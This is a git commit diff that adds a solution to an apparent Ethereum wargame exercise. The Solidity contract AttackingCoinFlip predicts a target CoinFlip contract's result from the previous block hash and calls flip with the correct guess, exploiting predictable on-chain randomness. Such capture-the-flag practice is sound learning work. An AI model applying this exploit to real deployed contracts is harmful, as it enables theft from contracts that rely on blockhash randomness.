a7790ad1b1ef673ff61f45ccfa181b7dc8ae6ff2
Kai <krikhye@gmail.com>
2022-06-08 00:22:41 -0400

    coinflip: add solution

--- contracts/1. CoinFlip/AttackingCoinFlip.sol
+++ contracts/1. CoinFlip/AttackingCoinFlip.sol
@@ -3,13 +3,19 @@ pragma solidity ^0.8.9;
 import "./CoinFlip.sol";
 
 contract AttackingCoinFlip {
-    address public contractAddress;
+
+    uint256 private constant FACTOR =
+        57896044618658097711785492504343953926634992332820282019728792003956564819968;
+
+    address private contractAddress;
 
     constructor(address _contractAddress) {
-        contractAddress = _contractAddress;
+	    contractAddress = _contractAddress;
     }
 
     function hackContract() external {
-        // Code me!
+        uint256 blockValue = uint256(blockhash(block.number - 1));
+        bool guess = blockValue / FACTOR == 1 ? true : false;
+        CoinFlip(contractAddress).flip(guess);
     }
 }
